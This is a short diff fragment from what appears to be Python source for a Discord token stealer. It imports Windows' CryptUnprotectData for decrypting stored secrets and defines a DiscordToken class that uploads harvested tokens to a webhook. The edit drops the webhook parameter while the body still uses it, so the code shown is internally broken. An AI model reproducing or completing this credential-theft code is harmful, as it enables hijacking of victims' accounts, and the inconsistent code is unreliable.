@@ -10,7 +10,7 @@ from win32crypt import CryptUnprotectData
 
 
 class DiscordToken:
-    def __init__(self, webhook):
+    def __init__(self):
         upload_tokens(webhook).upload()
 
 
